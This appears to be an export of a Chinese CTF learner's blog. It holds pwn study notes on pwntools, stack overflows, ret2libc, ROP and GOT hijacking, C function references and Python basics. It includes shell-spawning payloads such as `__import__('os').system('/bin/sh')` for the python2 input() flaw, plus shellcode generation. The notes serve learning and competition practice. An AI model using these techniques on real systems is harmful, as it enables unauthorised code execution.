<p><img src="/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/pwny1.jpg"><span class="image-caption">img</span></p>
<p>在上面的gdb.attach(p)就是运行脚本到此位置时打开gdb调试，然后在gdb框中输入c，就会运行到pause()处，然后我们就可以进行调试。这样就能准确的停在你想要的位置</p>
<p>41、mprotect修改内存权限的第一个参数必须是起始地址，修改的长度必须是页的倍数</p>
<p>42、<em><em>int snprintf(char</em> dest_str,size_t size,const char</em> format,…);**</p>
<p>将可变个参数(…)按照format格式化成字符串，然后将其复制到str中。返回值为欲写入的字符串长度</p>
<p>这个函数有个漏洞，因为返回值是欲写入的字符串长度，也就是说，被复制的字符串很长，又能被加载（比如%s）那返回值就可能很大，如果以这个作为某种输入的值就有产生溢出</p>
<p>43、程序是通过cs寄存器判断是64位还是32位，cs == 0x23代表32位模式，cs == 0x33代表64位模式，而cs寄存器可以通过<code>retfq</code>汇编指令来修改</p>
<p>retfq有两步操作：<code>ret以及set cs</code>，所以执行retfq会跳转到rsp同时将cs设置为[rsp+0x8]，我们只需要事先在ret位置写入32位的shellcode就可以执行了，但是这里有一点需要注意的是，retfq跳转过去的时候程序已经切换成了32位模式，所以地址解析也是以32位的规则来的，所以如原先的<code>rsp = 0x7ffe530d01b8</code>会被解析成<code>esp = 0x530d01b8</code></p>
<p>44、在大多数libc中read与write的symbols只一个字节不同，所以在一类没有泄露函数的栈题目中，可以考虑覆盖read的got表的最后一字节，变成write从而泄露libc</p>
]]></content>
  </entry>
  <entry>
    <title>初入PWN</title>
    <url>/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/</url>
    <content><![CDATA[<p>前提工具配置：</p>
<p>（1）Linux系统虚拟机：配置python3 、安装pwntools的pwn模块、安装gdb、安装pip（其他的工具在做题遇到时再去安装）</p>
<p>（2）本机IDA pro静态调试器和Ollydbg动态调式器（两个都要有32bit以及64bit的版本）</p>
<p>语法要求：</p>
<p>（1）汇编语法</p>
<p>（2）c语言（c++最好也掌握，不过这比较少见）</p>
<p>（3）python</p>
<p>（4）java（后面的补充学习，新手没必要学）</p>
<p>工具使用要求：</p>
<p>（1）学会IDA的静态调试</p>
<p>（2）学会gdb的动态调试</p>
<p>（3）pwntools的使用</p>
<p>​    ·······</p>
<p>一、PWN模块中用到的函数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>send(data)</td>
<td>发送数据（字符串形式发送）</td>
</tr>
<tr>
<td>sendline(data)</td>
<td>发送一行数据，默认在行尾加 \n（字符串形式发送）</td>
</tr>
<tr>
<td>recv(numb=1096,timeout=default)</td>
<td>接收指定字节数的数据</td>
</tr>
<tr>
<td>buf = p.recvuntil(“\n”, drop=True)</td>
<td>直到接收到\n为止，drop=True表示丢弃\n，buf为接收到的输出但不包括丢弃的\n</td>
</tr>
<tr>
<td>recvrepeat(timeout=default)</td>
<td>接收数据直到 EOF 或 timeout</td>
</tr>
<tr>
<td>recvall()</td>
<td>接收数据直到 EOF</td>
</tr>
<tr>
<td>recvline(keepends=True)</td>
<td>接收一行，可选择是否保留行尾的 \n</td>
</tr>
<tr>
<td>listen(端口)</td>
<td>开启一个本地的监听端口</td>
</tr>
<tr>
<td>remote(‘IP地址’, 端口)</td>
<td>与目标IP建立一个套接字管道与之远程交互（在线的）</td>
</tr>
<tr>
<td>interactive()</td>
<td>可同时读写管道，相当于回到 shell 模式进行交互，在取得 shell 之后调用</td>
</tr>
<tr>
<td>p8() p16()   p32()   p64()</td>
<td>把括号内数据打包成8位/16位/32位/64位的二进制数</td>
</tr>
<tr>
<td>u8() u16()  u32()   u64()</td>
<td>把括号内字符串解包成二进制数</td>
</tr>
<tr>
<td>process(‘文件路径’)</td>
<td>与本地文件建立一个交互通道</td>
</tr>
<tr>
<td>sendlineafter(“string”,payload)</td>
<td>接收到string后发送payload</td>
</tr>
<tr>
<td>close()</td>
<td>关闭交互的通道</td>
</tr>
<tr>
<td>ELF(‘文件路径’)</td>
<td>获取文件对象或者libc库对象</td>
</tr>
<tr>
<td>plt[‘函数名’]</td>
<td>获取函数在PLT表中的地址</td>
</tr>
<tr>
<td>got[‘函数名’]</td>
<td>获取函数在GOT表中的地址</td>
</tr>
<tr>
<td>symbols[‘函数名’]<br>或sym[‘函数名’]</td>
<td>获取函数plt地址，用在libc里面就是获取libc里的偏移地址</td>
</tr>
<tr>
<td>asm(“汇编指令”)</td>
<td>把汇编指令转换成对应的机器码，机器码是以字符串形式返回</td>
</tr>
<tr>
<td>bss(offset)</td>
<td>返回 .bss 段加上 offset 后的地址</td>
</tr>
<tr>
<td>asm(shellcraft.amd64.linux.sh()，arch=’amd64’)（这里是指明x64环境，如果已经有context设置环境就直接写为asm(shellcraft.sh())）</td>
<td>生成shellcode,一般与asm进行联用，转为对应机器码</td>
</tr>
<tr>
<td>context(arch=’amd64’或‘i386’,os=’linux’,log_level=’debug’)</td>
<td>设置环境</td>
</tr>
<tr>
<td>gdb.attach(p,’b* main’)</td>
<td>调动gdb进行脚本调式</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="一、x86架构下的栈溢出"><a href="#一、x86架构下的栈溢出" class="headerlink" title="一、x86架构下的栈溢出"></a>一、x86架构下的栈溢出</h3><p>栈区：简单来说就是c语言中创建的局部变量（例如函数花括号里的变量）的存储位置。内存中的栈区指的是系统栈，由系统自动维护。</p>
<p>栈在程序加载进内存后就会出现</p>
<p>入栈：每个函数都有一个属于自己的栈帧空间，最先压入栈内的是函数的返回地址（用来返回到下一条指令），之后是函数的基地址、参数入栈。例如主调函数在调用函数a时，主调函数先存入自身栈帧的为返回地址、自身基地址、传入函数a的实参（如果有的话），然后替函数a创建一个新栈帧，在新栈帧中先压入函数a的返回地址（为了函数调用结束时，可以返回到下一条指令继续程序），再压入主调函数的基地址（函数调用结束时，返回到主调函数的基地址）以及函数a中的局部变量。此时是高地址往低地址生长（主调函数在的位置为高地址）</p>
<p>退栈：而函数调用结束，则与调用时相反，先从被调函数的局部变量开始直接弹出栈，栈顶指向存储着被调函数基地址（存储主调函数基地址），被调函数基地址被弹出后，释放出主调函数的基地址给ebp，然后将返回地址弹出交给eip去执行，之后便返回到下一条指令的地址（这里举例为主调函数直接调用一个函数，如果层层嵌套，则先会返回到上一个主调函数的栈帧），继续程序的运行，ebp指向此刻的主调函数的基地址</p>
<p>系统中当前正在运行的函数总是在栈顶</p>
<p>与函数状态相关的主要寄存器：esp，ebp，eip：</p>
<p>（1）esp：栈指针寄存器，存放一个指针，该指针永远指向系统栈正在运行的栈帧的栈顶（存储函数调用栈的栈顶地址），在压栈和退栈时发生变化</p>
<p>（2）ebp：基地址指针寄存器，该指针永远指向系统栈正在运行的栈帧的底部，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置 </p>
<p>（3）在esp和ebp之间的内存空间为当前栈帧</p>
<p>（4）eip：用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令</p>
<p>因此，所谓的栈溢出漏洞，就是利用一些危险函数进行读取远超一个变量所需的数值，覆盖到相邻栈中的数值，从而修改相邻栈中的变量的值，往这些修改的值中注入我们所需要的跳转的例如shellcode，函数地址等，使程序崩坏或是让程序执行一些我们想要执行的程序，达到破坏的目的</p>
<p>x86下的CPU包含的8个四字节的通用寄存器：</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/271639137915732.jpg"></p>
<p>寄存器使用约定：寄存器eax、edx和ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器ebx、esi和edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器ebp和esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。</p>
<h3 id="return-to-libc"><a href="#return-to-libc" class="headerlink" title="return to libc"></a><strong>return to libc</strong></h3><h4 id="——构造system-“-bin-sh“"><a href="#——构造system-“-bin-sh“" class="headerlink" title="——构造system(“/bin/sh“)"></a>——构造system(“/bin/sh“)</h4><p>使用前提：ASLR被关闭，内存中存在可达到目的的特定函数</p>
<p>system地址：<strong>在ASLR 被关闭的前提下</strong>，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态链接库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
<p>/bin/sh字符串地址：可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过getenv() 等函数来确定地址。</p>
<h3 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP ( Return Oriented Programming )"></a><strong>ROP ( Return Oriented Programming )</strong></h3><h4 id="——修改返回地址，让其指向内存中已有的一段指令"><a href="#——修改返回地址，让其指向内存中已有的一段指令" class="headerlink" title="——修改返回地址，让其指向内存中已有的一段指令"></a>——修改返回地址，让其指向内存中已有的一段指令</h4><p>利用一个及以上的gadget执行指令，最终调用能修改权限的函数，例如编号为125的函数mprotect()可修改栈的属性，从而利用shellcode。若是要连续使用多个gadget时一定要找含有ret指令的片段</p>
<p>被调用函数的编号应存入 eax，调用参数应按顺序存入 ebx，ecx，edx，esi，edi 中</p>
<p>那么如果要调用函数，就需要参数，而参数被存入在上方列举的寄存器中，那么此时我们要做的就是向寄存器存入我们需要的参数 ：</p>
<p>1）如果在内存中已经存在我们要的数据，可用mov指令来存入 </p>
<p>2）用pop指令来将栈顶数据弹入寄存器，pop 所传输的数据应该在 gadget 地址之后，如图：</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/v2-07a48918aeb2f8b7dd2ddc4836a7b773_720w.png"></p>
<p>我们可以使用 push esp 这个gadget来执行shellcode</p>
<p>对于所有包含 pop 指令的 gadget，在其gadget地址之后都要添加 需要pop传入寄存器的数据，同时在所有 gadget 最后包含一段shellcode</p>
<p>如果利用 gadget 读取 ebp 的值再加上某个合适的数值，就可以保证溢出数据都具有可执行权限，这样就不再需要获取确切地址，也就具有了<strong>绕过内存随机化（ALSR）</strong>的可能。</p>
<h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a><strong>Hijack GOT</strong></h3><h4 id="——修改某个被调用函数的地址，让其指向另外一个函数"><a href="#——修改某个被调用函数的地址，让其指向另外一个函数" class="headerlink" title="——修改某个被调用函数的地址，让其指向另外一个函数"></a>——修改某个被调用函数的地址，让其指向另外一个函数</h4><p>该方法是直接把函数修改成我们需要的函数，不再执行原来的函数，而不是上方执行某个函数后由返回地址进行跳转</p>
<p>函数在链接库中定位所用到的外部函数会用到GOT和PLT这两张表。GOT 全称是全局偏移量表（<strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able），用来存储外部函数在内存的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行中被修改。PLT 全称是程序链接表（<strong>P</strong>rocedure <strong>L</strong>inkage <strong>T</strong>able），用来存储外部函数的入口点（entry），换言之程序总会到 PLT 这里寻找外部函数的地址。PLT 存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改，所以 PLT 并不会知道程序运行时动态链接库被加载的确切位置。那么 PLT 表内存储的入口点是 GOT 表中对应条目的地址。</p>
<p>程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT  表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT  表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT  表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p>
<p>通过以上的介绍，那么实现修改函数的地方在于GOT表里的函数地址修改，让GOT执行的是我们需要的函数即可。既然这样，接下来需要做的工作是找到原函数的在GOT里的地址（GOT里函数的地址由PLT跳转，所以找PLT中函数的入口点）以及我们需要函数的地址，把我们需要的函数的地址替换到GOT</p>
<p>函数在动态链接库内的相对位置是<strong>固定的</strong>，在动态库打包生成时就已经确定。所以假如我们知道了某函数运行时地址（读取 GOT 表内容），也知道该函数和我们所需函数在动态链接库内的相对位置，就可以推算出函数的地址</p>
<p>最后在GOT中的替换修改，就需要用到上一个的ROP的方法实现</p>
<p>来源：</p>
<p><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上）</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/25892385">手把手教你栈溢出从入门到放弃（下）</a></p>
<h3 id="二、x64架构下的栈溢出"><a href="#二、x64架构下的栈溢出" class="headerlink" title="二、x64架构下的栈溢出"></a>二、x64架构下的栈溢出</h3><p>x64位下的十六个通用寄存器：</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/register.png"></p>
<p>需要补充：在gcc下编译的才是把前六个参数依次放入rdi,rsi,rdx,rcx,r8,r9，而如果在VS编译环境下的只有前四个参数依次放入rcx,rdx,r8,r9</p>
<p>gcc编译环境：在通用寄存器中，函数执行前后必须保持原始的寄存器有3个：是rbx、rbp、rsp。rx寄存器中，最后4个必须保持原值：r12、r13、r14、r15。</p>
<p>保持原值的意义是为了让当前函数有可信任的寄存器，减小在函数调用过程中的保存&amp;恢复操作。除了rbp、rsp用于特定用途外，其余5个寄存器可随意使用。</p>
<p>通用寄存器中，不必假设保存值可随意使用的寄存器有5个：是rax、rcx、rdx、rdi、rsi。其中rax用于第一个返回寄存器（当 然也可以用于其它用途），rdx用于第二个返回寄存器（在调用函数时也用于第三个参数寄存器）</p>
<p>x86和x64下的创建栈帧的过程基本一致，就不再赘述了。</p>
<p>二者简单区别在于被调函数的参数的存储位置</p>
<ul>
<li>x86<ul>
<li>存储在主调函数的栈帧中，在函数返回地址的上方</li>
</ul>
</li>
<li>x64<ul>
<li>函数的前六个整型或指针参数依次保存在RDI,RSI,RDX,RCX,R8,R9中，如果还有更多的参数的话才会保存在栈上</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常</li>
<li>栈按照16字节对齐（就是说栈的大小是16的倍数）</li>
</ul>
</li>
</ul>
<p>来源于 CTF-wiki </p>
<p>栈溢出危险函数：</p>
<p>（1）输入</p>
<ul>
<li>gets 读取一行，忽略\x00（’\0’）</li>
<li>scanf</li>
<li>vscanf</li>
<li>read</li>
</ul>
<p>（2）输出</p>
<ul>
<li>sprintf</li>
</ul>
<p>（3）字符串函数</p>
<ul>
<li>strcat 字符串拼接，遇到\x00（’\0’）停止</li>
<li>strcpy 字符串复制，遇到\x00（’\0’）停止</li>
<li>bcopy</li>
</ul>
<hr>
<p>补充（一些我不懂的知识点）：</p>
<p>1、系统调用输入函数*<em>read(int fd, void <em>buf, size_t count)</em></em></p>
<p>size_t：表示无符号整数</p>
<p>ssize_t：表示有符号整数</p>
<p>（1）fd：将要读取数据的文件描述符；buf：所读取到的数据的内存缓冲；count：需要读取的数据量。</p>
<p>（2）fd为0时，表示为标准输入（键盘上获取输入），这时也是我们可以进行输入的时候；buf就是指一块存储空间，获取到的数据填入这里</p>
<p>（3）函数**write(int fd, void *buf, size_t count)**与之对应，是向buf缓存区写入一些数据，fd为1时表示为标准输出（显示在显示器上）</p>
<p>（4）fd=2时表示标准错误，这0，1，2是系统默认使用的，而3，4……等，可以由使用者自行决定</p>
<p>（5）成功<strong>返回读取的字节数</strong>，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0</p>
<p>2、<strong>atoi()</strong> 功能是把字符串转换成整数（int类型的），还有个相同功能的**atol()**是把字符串转换成长整型数（long类型的）</p>
<p>3、python发送数据的固定格式为：$(python -c “print ‘\xe8\x05\xd9\x1d’ + ‘\x01’*16’ “)(这里pwnable.kr col题作为一个例子，强调这里不用\x00是因为会阻断)</p>
<p>随机数问题中的函数：rand() ，srand()，time()</p>
<p>1、<strong>rand()<strong>原型为：</strong>int rand(void)</strong> 。rand() 用来产生随机数，但是，rand()的内部实现是用线性同余法实现的，是伪随机数，由于周期较长，因此在一定范围内可以看成是随机的</p>
<p>（1）**rand()**会返回一个范围在0到RAND_MAX（32767）之间的伪随机数（整数）</p>
<p>（2）使用rand()函数产生0-99以内的随机整数：int number1 = rand() % 100; (如果要生成1-100，在后面加1即可)</p>
<p>（3）如果没有设置随机数种子，rand()函数在调用时，自动设计随机数种子为1（相当于srand(1)的情况）。随机种子相同，每次产生的随机数也会相同。</p>
<p>2、time()：是C语言获取当前系统时间的函数，以秒作单位，代表当前时间自Unix标准时间戳(1970年1月1日0点0分0秒，GMT)经过了多少秒</p>
<p>（1）一般在随机数中，使用形式为time(0),获取正在变化的时间值，来配合srand()函数进行初始化函数发生器，生成不同的随机数</p>
<p>3、**srand()<strong>原型为：</strong>void srand (usigned int seed)**。用来设置rand()产生随机数时的随机数种子</p>
<p>（1）通常可以利用time(0)或geypid(0)的返回值作为seed</p>
<p>（2）使用srand()函数可以用来给rand()函数生成不一样的随机数种子</p>
<p>（3）使用rand()和srand()产生0-99以内的真正的随机整数:  srand(time(0));     int number1 = rand() % 100;</p>
<p>注：用time(0)作为随机数种子时，两次程序运行的时间间隔要超过一秒，否则两次运行得到的随机数将一致</p>
<p>4、**memcpy()**函数原型为 **void *memcpy(void <em>destin, void <em>source, unsigned n)</em></em> 功能为：从源source中拷贝n个字节到目标destin中，不会自动加上’\0’</p>
<p>5、**memset()<strong>原型为：</strong>void <em>memset(void <em>s, int ch, size_t n)</em></em>  功能为将s中当前位置后面的n个字节用 ch 替换并返回 s </p>
<p>注：这里用ch做符号，是因为该函数只能取ch的低八位数，取值范围为0~255，跟字符的取值一样</p>
<p>6、memcmp()函数原型为**int memcmp(const void *str1, const void *str2, size_t n)**功能为比较内存区域buf1和buf2的前n个字节，str1&gt;str2,返回正数；str1=str2返回0；str1&lt;str2返回负数，比大小时，一旦能确认大小则停止比较，直接返回数值</p>
<p>7、rax eax ax ah al分别是：64位、低32位、低16位、ax的高8位、ax的低8位</p>
<p>8、**strchr()<strong>函数原型为：</strong>char *strchr(const char *str, int c)**功能为在str所指向的字符串中搜索第一次出现ASCII码值为c的字符的位置，若存在则返回该字符的地址，否则返回NULL</p>
<p>9、violatile关键字通常用来修饰多线程共享的全局变量和IO内存。告诉编译器，不要把此类变量优化到寄存器中，每次都要老老实实的从内存中读取，因为它们随时都可能变化。</p>
<p>10、函数返回值是通过寄存器进行返回的。编译器使用eax作为存储返回值的寄存器，被调函数在ret前设置eax，返回后，主调函数从eax获取到该值。</p>
<p>11、**mprotect()<strong>函数原型为</strong>int mprotect(const void *start, size_t len, int prot)**功能为mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值（可读为4，可写为2，可执行为1）一般直接取7。</p>
<p>12、<strong>xxd</strong>命令可以查看文件的十六进制值，<strong>xxd 文件名 | tail</strong>可以打印十六进制值中的末尾数据。如果文件是被加上了upx压缩壳，可以输入<strong>upx -d</strong> 文件名 进行解压</p>
<p>13、**fflush(stdin)**是清空输入缓冲区的意思</p>
<p>14、<strong>malloc</strong>函数原型为为**void *malloc(unsigned int size)**；其作用是在内存的动态存储区中分配一个长度为size的连续空间。此函数的返回值是分配区域的起始地址，或者说，此函数是一个指针型函数，返回的指针指向该分配域的开头位置。</p>
<p>分配成功则返回指向被分配内存的指针(此存储区中的初始值不确定)，否则返回空指针NULL。当动态内存不再使用时，应使用free()函数将内存块释放。</p>
<p>15、setvbuf原型 <strong>int setvbuf(FILE *stream, char *buf, int type, unsigned size)</strong> 用于设定文件流的缓冲区</p>
<p>type ： 期望缓冲区的类型：</p>
<p>_IOFBF(满缓冲）：当缓冲区为空时，从流读入数据。或者当缓冲区满时，向流写入数 据。</p>
<p>_IOLBF(行缓冲）：每次从流中读入一行数据或向流中写入一行数据。</p>
<p>_IONBF(无缓冲）：直接从流中读入数据或直接向流中写入数据，而没有缓冲区。</p>
<p>size ： 缓冲区内字节的数量。</p>
<p>成功执行返回0,否则返回非零值</p>
<p>16、**/dev/random<strong>和</strong>/dev/urandomLinux**是系统中提供的随机伪设备。这两个设备的任务，是提供永不为空的随机字节数据流 </p>
<p>用法：用open函数打开，然后从文件描述符中获取数据即可。</p>
<p>17、strcspn函数原型：**size_t strcspn(const char *s, const char * reject) **</p>
<p>功能：strcspn()从参数s 字符串的开头计算连续的字符，而这些字符都完全不在参数reject 所指的字符串中。简单地说， 若strcspn()返回的数值为n，则代表字符串s 开头连续有n 个字符都不含字符串reject 内的字符。</p>
<p>返回值为返回字符串s 开头连续不含字符串reject 内的字符数目。</p>
<p>18、回车 代码：CR ASCII码：/ r ，十六进制，0x0d，回车的作用只是移动光标至该行的起始位置；</p>
<p>换行 代码：LF ASCII码：/ n ，十六进制，0x0a，换行至下一行行首起始位置；</p>
<p>19、snprintf 函数原型**int snprintf(char <em>str, size_t size, const char <em>format, …)</em></em></p>
<p>功能：将可变个参数(…)按照format格式化成字符串，然后将其复制到str中。</p>
<p>(1) 如果格式化后的字符串长度 &lt; size，则将此字符串全部复制到str中，并给其后添加一个字符串结束符(‘\0’)；</p>
<p>(2) 如果格式化后的字符串长度 &gt;= size，则只将其中的(size-1)个字符复制到str中，并给其后添加一个字符串结束符(‘\0’)，返回值为欲写入的字符串长度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> a[<span class="hljs-number">16</span>];<br>  <span class="hljs-keyword">size_t</span> i;<br> <br>  i = <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-number">13</span>, <span class="hljs-string">&quot;%012d&quot;</span>, <span class="hljs-number">12345</span>);  <span class="hljs-comment">// 第 1 种情况</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %lu, a = %s\n&quot;</span>, i, a);    <span class="hljs-comment">// 输出：i = 12, a = 000000012345</span><br> <br>  i = <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;%012d&quot;</span>, <span class="hljs-number">12345</span>);   <span class="hljs-comment">// 第 2 种情况</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %lu, a = %s\n&quot;</span>, i, a);    <span class="hljs-comment">// 输出：i = 12, a = 00000001</span><br> <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>20、<strong>int execve(const char * filename,char * const argv[ ],char * const envp[ ])</strong></p>
<p>execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。</p>
<p>21、**getchar()**的返回值为输入字符的ASCII码值。又因为在字符串在内存里面都是以ASCII码值存储的，我们输入的payload都是字符串，换言之，进行循环的getchar就是另类的read</p>
<p>22、**extern char <em>strdup(char <em>s)</em></em></p>
<p>strdup()可以将字符串拷贝到新建的位置处，strdup()在内部调用了malloc()为变量分配内存，不需要使用返回的字符串时，需要用free()释放相应的内存空间，否则会造成内存泄漏。返回一个指针,指向为复制字符串分配的空间，如果分配空间失败,则返回NULL值</p>
<p>23、<strong>size_t getpagesize(void)</strong></p>
<p>函数功能为：返回一分页的大小，单位为字节(byte)。此为系统的分页大小，不一定会和硬件分页大小相同。</p>
<p>返回值：内存分页大小。</p>
<p>24、**extern void <em>memchr(const void <em>buf, int ch, size_t count)</em></em></p>
<p>功能：从buf所指内存区域的前count个字节查找字符ch。</p>
<p>说明：当第一次遇到字符ch时停止查找。如果成功，返回指向字符ch的指针；否则返回NULL。</p>
<p>25、<strong>FILE *fopen(const char *filename, const char *mode)</strong></p>
<ul>
<li><strong>filename</strong>– 这是 C 字符串，包含了要打开的文件名称。</li>
<li><strong>mode</strong>– 这是 C 字符串，包含了文件访问模式。</li>
</ul>
<p>功能：使用给定的模式<strong>mode</strong>打开<strong>filename</strong>所指向的文件；文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回 NULL，并把错误代码存在error中</p>
<p>26、<strong>size_t fread( void *buffer, size_t size, size_t count, FILE *stream )</strong></p>
<ul>
<li><strong>buffer–指向要输入的数组中首个对象的指针</strong></li>
<li><strong>size– 每个对象的大小（单位是字节）</strong></li>
<li><strong>count– 要读取的对象个数</strong></li>
<li><strong>stream– 输入流</strong></li>
</ul>
<p>功能：从给定输入流stream读取最多count个对象到数组buffer中（相当于对每个对象调用size次fgetc)，把buffer当作unsigned char数组并顺序保存结果。流的文件位置指示器前进读取的字节数。</p>
<p>27、**char <em>strtok(char s[], const char <em>delim)</em></em></p>
<p>功能：分解字符串为一组字符串。s为要分解的字符串，delim为分隔符字符（如果传入字符串，则传入的字符串中每个字符均为分割符）。首次调用时，s指向要分解的字符串，之后再次调用要把s设成NULL</p>
<p>返回值：从s开头开始的一个个被分割的串。当s中的字符查找到末尾时，返回NULL；如果查找不到delim中的字符时，返回当前strtok的字符串的指针。</p>
<p>28、*<em>long int strtol(const char <em>nptr,char **endptr,int base)</em></em></p>
<p>功能：strtol函数会将参数nptr字符串根据参数base来转换成长整型数，参数base范围从2至36</p>
<p>参数base代表采用的进制方式，如base值为10则采用10进制，若base值为16则采用16进制等。当base值为0时则是采用10进制做转换，但遇到如’0x’前置字符则会使用16进制做转换、遇到’0’前置字符而不是’0x’的时候会使用8进制做转换。</p>
<p>29、python2中的input()函数存在漏洞，会执行获得的输入，所以如果脚本存在引入os库输入<code>os.system(&#39;/bin/sh&#39;)</code>即可getshell，如没有引入os库，输入该内容<code>__import__(&#39;os&#39;).system(&#39;/bin/sh&#39;)</code> 也可getshell</p>
<p>30、</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/image-20211007195137781.png"><span class="image-caption">image-20211007195137781</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-built_in">print</span>(binascii.b2a_hex(asm(<span class="hljs-string">&#x27;jmp $+0x9e&#x27;</span>)))<br></code></pre></td></tr></table></figure>

<p>可用该方法得到汇编的机器码</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Python笔记</title>
    <url>/2020/11/09/2020-11-09-Python%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>注：版本为python3（学习来自菜鸟教程）</p>
<h3 id="一、基础语法"><a href="#一、基础语法" class="headerlink" title="一、基础语法"></a>一、基础语法</h3><p>1、标识符：第一个字符必须为字母或者下划线，对大小写敏感（在python3中<strong>允许中文</strong>作为变量名）</p>
<p>**关键字：’False’, ‘None’, ‘True’, ‘and’, ‘as’, ‘assert’, ‘break’, ‘class’, ‘continue’, ‘def’, ‘del’, ‘elif’, ‘else’, ‘except’, ‘finally’, ‘for’, ‘from’, ‘global’, ‘if’, ‘import’, ‘in’, ‘is’, ‘lambda’, ‘nonlocal’, ‘not’, ‘or’, ‘pass’, ‘raise’, ‘return’, ‘try’, ‘while’, ‘with’, ‘yield’ **</p>
<p>2、单行注释以#开头，多行注释可以变成每行用一个#</p>
<p>在’’’     ‘’’ （或是”””   “””）之间进行多行注释</p>
<p>3、python中使用缩进表示代码块，不再使用｛｝（缩进的空格数不限制，但是同一个代码块的缩进空格数必须保持一致）</p>
<p>4、当语句过长想要分行写时，可以在末尾加上一个 \ 表示下一行是上一行的连续（不建议使用）；或是包在( )  ，{ } ， [ ] 里面进行分行写也可以，此时就不要  \ 了</p>
<p>5、‘ \ ’表示转义符号，而把r写在前面可以让 \ 不发生转义，而当做一个字符</p>
<p>6、字符串中：python中单引号与双引号用法相同（虽然如此，当作为先学c的话，还是按着c的来比较好），而使用’’’ 或者”””可以指定一个多行字符串</p>
<p>会按字面意思进行连接字符串如：“this” “is” “string”会自动换为this is string</p>
<p>字符串可以用+表示连字符连接在一起，用*a复制当前字符，a表示复制次数</p>
<p>python中的字符串从<strong>左往右以0作为开始，从右往左是-1开始</strong>。并且字符串不能被改变</p>
<p>python中没有字符类型，一个字符就是另类的长度为1的字符串</p>
<p>字符串的截取格式为：<strong>变量[头下标:尾下标]</strong>   当把尾下标为空时，表示从头下标的位置输出之后的字符</p>
<p>7、空行：函数之间或类之间用空行分隔，表示新一段代码的开始。有没有不会对程序造成影响，其作用在于美观以及便于复查</p>
<p>8、input(  )等待用户输入，返回值是字符串类型</p>
<p>9、python在同一行中使用多条语句，语句之间使用   <strong>;</strong>   分隔 而若是每行只写一个语句，则无需分号</p>
